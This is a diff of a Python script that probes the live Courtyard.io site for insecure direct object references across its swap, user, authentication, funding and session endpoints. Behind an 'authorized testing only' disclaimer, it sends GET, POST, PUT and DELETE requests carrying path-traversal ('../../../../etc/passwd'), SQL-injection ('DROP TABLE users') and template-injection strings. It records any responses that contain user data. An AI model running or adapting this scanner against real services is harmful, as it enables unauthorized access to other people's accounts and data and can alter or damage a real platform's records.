@@ -1,189 +1,217 @@
 #!/usr/bin/env python3
 """
-Courtyard.io IDOR Tester
-Tests swap negotiation endpoints for Insecure Direct Object Reference.
-FOR AUTHORIZED SECURITY TESTING ONLY - EDUCATIONAL PURPOSES ONLY
+Courtyard.io IDOR Scanner
+Tests swap negotiation and user endpoints for IDOR vulnerabilities.
+FOR AUTHORIZED SECURITY TESTING AND EDUCATIONAL PURPOSES ONLY
 """
 import requests
 import json
-import time
-from pathlib import Path
+import random
+import string
 from datetime import datetime
+from pathlib import Path
 
-HEADERS = {
-    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
-    'Accept': 'application/json',
-    'Content-Type': 'application/json',
-}
+BASE_URL = "https://courtyard.io"
+API_URL = f"{BASE_URL}/api"
+V2_URL = f"{API_URL}/v2"
 
-BASE = "https://courtyard.io"
-API_SUB = "https://api.courtyard.io"
-
-# IDOR test patterns
-ID_PATTERNS = [
-    # Sequential IDs
-    *[str(i) for i in range(1, 100)],
-    # Common UUID patterns
+# Test IDs to try (common patterns)
+TEST_IDS = [
+    "1", "2", "3", "4", "5", "10", "100", "1000",
     "00000000-0000-0000-0000-000000000001",
+    "ffffffff-ffff-ffff-ffff-ffffffffffff",
     "11111111-1111-1111-1111-111111111111",
-    # Firebase-style IDs (20 chars)
-    "a" * 20,
-    "1" * 20,
+    "12345678-1234-1234-1234-123456789012",
+    "aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa",
+    "00000000000000000000000000000000",
+    "test", "admin", "null", "undefined", "true",
+    "../../../../etc/passwd",
+    "1' OR '1'='1", "1 OR 1=1", 
+    "'; DROP TABLE users; --",
+    "${7*7}", "{{7*7}}",
+    "😀", "∞", "NULL",
 ]
 
-ENDPOINTS = {
-    "negotiation": "/v2/swap/negotiations/{}",
-    "user_negotiations": "/v2/swap/users/{}/negotiations",
-    "asks": "/v2/swap/negotiations/{}/asks",
-    "bids": "/v2/swap/negotiations/{}/bids",
-    "accept_ask": "/v2/swap/negotiations/{}/asks/{}/accept",
-}
-
-def test_endpoint(name, url, auth_token=None):
-    """Test an endpoint for IDOR vulnerability."""
-    headers = dict(HEADERS)
-    if auth_token:
-        headers['Authorization'] = f'Bearer {auth_token}'
-
-    results = []
-    for test_id in ID_PATTERNS[:20]:  # Limit to 20 tests per endpoint
-        try:
-            full_url = f"{BASE}{url.format(test_id, test_id)}"
-            r = requests.get(full_url, headers=headers, timeout=10, allow_redirects=False)
-
-            result = {
-                "endpoint": name,
-                "test_id": test_id,
-                "status": r.status_code,
-                "size": len(r.text),
-                "timestamp": datetime.now().isoformat(),
-            }
-
-            # Check for data leakage
-            if r.status_code == 200:
-                try:
-                    data = r.json()
-                    result["json"] = data
-                    result["vulnerable"] = True
-                    result["leakage"] = "JSON data returned without auth"
-                except:
-                    if "negotiation" in r.text.lower() or "user" in r.text.lower():
-                        result["vulnerable"] = True
-                        result["leakage"] = "Data-like response without auth"
-                    else:
-                        result["vulnerable"] = False
-
-            elif r.status_code == 403:
-                result["vulnerable"] = False
-                result["note"] = "Forbidden - auth required"
-
-            elif r.status_code == 401:
-                result["vulnerable"] = False
-                result["note"] = "Unauthorized - auth required"
-
-            elif r.status_code == 404:
-                result["vulnerable"] = False
-                result["note"] = "Not found - ID doesn't exist"
-
-            results.append(result)
-
-        except requests.Timeout:
-            results.append({"endpoint": name, "test_id": test_id, "status": "timeout"})
-        except Exception as e:
-            results.append({"endpoint": name, "test_id": test_id, "status": "error", "error": str(e)})
-
-        time.sleep(0.5)  # Rate limit
-
-    return results
-
-def test_api_subdomain(name, test_id, auth_token=None):
-    """Test on api.courtyard.io subdomain."""
-    headers = dict(HEADERS)
-    if auth_token:
-        headers['Authorization'] = f'Bearer {auth_token}'
-
-    results = []
-    url = f"{API_SUB}/v2/swap/negotiations/{test_id}"
-
-    try:
-        r = requests.get(url, headers=headers, timeout=10)
-        results.append({
-            "endpoint": f"api.{name}",
-            "test_id": test_id,
-            "status": r.status_code,
-            "size": len(r.text),
-            "response": r.text[:200],
-            "timestamp": datetime.now().isoformat(),
+class CourtyardIDOR:
+    def __init__(self):
+        self.session = requests.Session()
+        self.session.headers.update({
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+            "Accept": "application/json",
+            "Content-Type": "application/json",
         })
-    except Exception as e:
-        results.append({"endpoint": f"api.{name}", "test_id": test_id, "error": str(e)})
-
-    return results
-
-def scan_all():
-    """Run full IDOR scan."""
-    all_results = []
-
-    print("=== Courtyard.io IDOR Tester ===")
-    print(f"Time: {datetime.now().isoformat()}")
-    print()
-
-    # Test main domain (no auth)
-    print("[*] Testing main domain (no auth)...")
-    for name, url in ENDPOINTS.items():
-        print(f"  Testing {name}...")
-        results = test_endpoint(name, url)
-        all_results.extend(results)
-
-    # Test API subdomain (no auth)
-    print("\n[*] Testing api.courtyard.io (no auth)...")
-    for test_id in ID_PATTERNS[:5]:
-        results = test_api_subdomain("negotiation", test_id)
-        all_results.extend(results)
-
-    # Analyze results
-    vulnerable = [r for r in all_results if r.get("vulnerable")]
-    forbidden = [r for r in all_results if r.get("status") == 403]
-    unauthorized = [r for r in all_results if r.get("status") == 401]
-    not_found = [r for r in all_results if r.get("status") == 404]
-    errors = [r for r in all_results if "error" in r]
-
-    print(f"\n=== RESULTS ===")
-    print(f"Total tests: {len(all_results)}")
-    print(f"Vulnerable (data leaked): {len(vulnerable)}")
-    print(f"Forbidden (auth required): {len(forbidden)}")
-    print(f"Unauthorized: {len(unauthorized)}")
-    print(f"Not found: {len(not_found)}")
-    print(f"Errors: {len(errors)}")
-
-    if vulnerable:
-        print(f"\n=== VULNERABLE ENDPOINTS ===")
-        for v in vulnerable:
-            print(f"  [{v['endpoint']}] ID: {v['test_id']}")
-            print(f"    Status: {v['status']}")
-            print(f"    Leakage: {v.get('leakage', 'N/A')}")
-            if 'json' in v:
-                print(f"    Data: {json.dumps(v['json'], indent=2)[:500]}")
-
-    # Save results
-    output = {
-        "scan_time": datetime.now().isoformat(),
-        "total_tests": len(all_results),
-        "summary": {
-            "vulnerable": len(vulnerable),
-            "forbidden": len(forbidden),
-            "unauthorized": len(unauthorized),
-            "not_found": len(not_found),
-        },
-        "vulnerable_endpoints": vulnerable,
-        "all_results": all_results,
-    }
-
-    output_path = Path("courtyard_idor_results.json")
-    output_path.write_text(json.dumps(output, indent=2))
-    print(f"\n[+] Results saved to: {output_path}")
-
-    return output
+        self.findings = []
+        self.log_dir = Path.home() / "courtyard_idor"
+        self.log_dir.mkdir(exist_ok=True)
+    
+    def log(self, data):
+        """Log a finding."""
+        with open(self.log_dir / "findings.jsonl", "a") as f:
+            f.write(json.dumps(data, default=str, indent=2) + "\n")
+    
+    def test_endpoint(self, method: str, path: str, description: str = ""):
+        """Test a single endpoint for IDOR by substituting test IDs."""
+        results = []
+        
+        for test_id in TEST_IDS:
+            # Replace {id}, {negotiationId}, {bidId} placeholders
+            test_path = path.replace("{id}", str(test_id))
+            test_path = test_path.replace("{negotiationId}", str(test_id))
+            test_path = test_path.replace("{bidId}", str(test_id))
+            test_path = test_path.replace("{ask_id}", str(test_id))
+            test_path = test_path.replace("{negotiation_id}", str(test_id))
+            test_path = test_path.replace("{userId}", str(test_id))
+            test_path = test_path.replace("{bid_id}", str(test_id))
+            
+            url = f"{API_URL}{test_path}" if not test_path.startswith("/v2") else f"{BASE_URL}{test_path}"
+            
+            try:
+                if method == "GET":
+                    resp = self.session.get(url, timeout=10)
+                elif method == "POST":
+                    resp = self.session.post(url, json={}, timeout=10)
+                elif method == "PUT":
+                    resp = self.session.put(url, json={}, timeout=10)
+                elif method == "DELETE":
+                    resp = self.session.delete(url, timeout=10)
+                else:
+                    continue
+                
+                result = {
+                    "timestamp": datetime.now().isoformat(),
+                    "method": method,
+                    "url": url,
+                    "test_id": test_id,
+                    "status_code": resp.status_code,
+                    "content_length": len(resp.text),
+                    "content_type": resp.headers.get("Content-Type", ""),
+                    "has_json": False,
+                    "has_user_data": False,
+                    "has_error": False,
+                    "potential_vuln": False,
+                    "response_body": resp.text[:500] if resp.status_code != 200 else resp.text[:100],
+                }
+                
+                # Check for JSON response (potential IDOR)
+                try:
+                    data = resp.json()
+                    result["has_json"] = True
+                    
+                    # Check for user data in response
+                    user_keywords = ["user", "email", "name", "wallet", "balance", "id", "address", "account"]
+                    for kw in user_keywords:
+                        if kw.lower() in str(data).lower():
+                            result["has_user_data"] = True
+                            break
+                    
+                    # Check for error messages that reveal info
+                    error_keywords = ["unauthorized", "forbidden", "permission", "access denied", "invalid token"]
+                    for kw in error_keywords:
+                        if kw.lower() in str(data).lower():
+                            result["has_error"] = True
+                            break
+                    
+                    # Potential vuln: 200 with user data
+                    if resp.status_code == 200 and result["has_user_data"]:
+                        result["potential_vuln"] = True
+                    
+                except:
+                    pass
+                
+                # Potential vuln: different status codes for different IDs
+                if resp.status_code in [200, 201, 403, 404]:
+                    results.append(result)
+                    
+            except Exception as e:
+                continue
+        
+        return results
+    
+    def run_all(self):
+        """Run IDOR scan on all endpoints."""
+        
+        # Endpoints that might be vulnerable to IDOR
+        endpoints = [
+            # Swap endpoints (highest priority)
+            ("GET", "/v2/swap/negotiations/{id}", "Swap negotiation by ID"),
+            ("GET", "/v2/swap/negotiations/{negotiationId}/asks", "Swap asks"),
+            ("GET", "/v2/swap/negotiations/{negotiation_id}/bids", "Swap bids"),
+            ("GET", "/v2/swap/bids/{bidId}", "Swap bid by ID"),
+            ("GET", "/v2/swap/users/{userId}/negotiations", "User negotiations"),
+            ("POST", "/v2/swap/negotiations/{id}/asks", "Create ask"),
+            ("POST", "/v2/swap/negotiations/{id}/bids", "Create bid"),
+            ("POST", "/v2/swap/negotiations/{negotiation_id}/asks/{ask_id}/accept", "Accept ask"),
+            
+            # User endpoints
+            ("GET", "/v1/users/me", "Current user"),
+            ("GET", "/v1/users/{id}", "User by ID"),
+            ("PUT", "/v1/users/me", "Update user"),
+            
+            # Auth endpoints
+            ("POST", "/v1/farcaster/authenticate", "Farcaster auth"),
+            ("POST", "/v1/siwe/authenticate", "SIWE auth"),
+            ("POST", "/v1/oauth/authenticate", "OAuth auth"),
+            
+            # Funding endpoints
+            ("POST", "/v1/funding/coinbase_on_ramp/init", "Coinbase on-ramp"),
+            ("POST", "/v1/funding/moonpay_on_ramp/sign", "Moonpay sign"),
+            
+            # Session endpoints
+            ("GET", "/v1/sessions", "Sessions"),
+            ("DELETE", "/v1/sessions/logout", "Logout"),
+        ]
+        
+        print("=" * 60)
+        print("COURTYARD.IO IDOR SCANNER")
+        print("=" * 60)
+        print(f"Base URL: {BASE_URL}")
+        print(f"Test IDs: {len(TEST_IDS)}")
+        print(f"Endpoints: {len(endpoints)}")
+        print("=" * 60)
+        
+        for i, (method, path, desc) in enumerate(endpoints):
+            print(f"\n[{i+1}/{len(endpoints)}] Testing: {method} {path} ({desc})")
+            results = self.test_endpoint(method, path, desc)
+            
+            # Check for IDOR patterns
+            status_codes = [r["status_code"] for r in results]
+            unique_codes = set(status_codes)
+            
+            if len(unique_codes) > 1:
+                print(f"  ⚠️  MIXED STATUS CODES: {unique_codes}")
+                for r in results:
+                    if r["potential_vuln"]:
+                        print(f"  🚨 POTENTIAL IDOR: {r['test_id']} -> {r['status_code']} (user data: {r['has_user_data']})")
+                        self.log(r)
+                        self.findings.append(r)
+            elif 200 in unique_codes:
+                print(f"  ℹ️  All 200s (may need auth)")
+            else:
+                print(f"  ✓  Consistent: {unique_codes}")
+        
+        # Summary
+        print("\n" + "=" * 60)
+        print("SCAN SUMMARY")
+        print("=" * 60)
+        print(f"Total findings: {len(self.findings)}")
+        
+        if self.findings:
+            print("\n🚨 POTENTIAL VULNERABILITIES:")
+            for f in self.findings:
+                print(f"  [{f['method']}] {f['url']}")
+                print(f"    Status: {f['status_code']} | Test ID: {f['test_id']}")
+                print(f"    User data: {f['has_user_data']} | Error: {f['has_error']}")
+                print(f"    Body: {f['response_body'][:100]}")
+                print()
+        
+        # Save full results
+        with open(self.log_dir / "scan_results.json", "w") as f:
+            json.dump(self.findings, f, indent=2, default=str)
+        
+        print(f"Full results: {self.log_dir / 'scan_results.json'}")
+        
+        return self.findings
 
 if __name__ == "__main__":
-    scan_all()
+    scanner = CourtyardIDOR()
+    scanner.run_all()
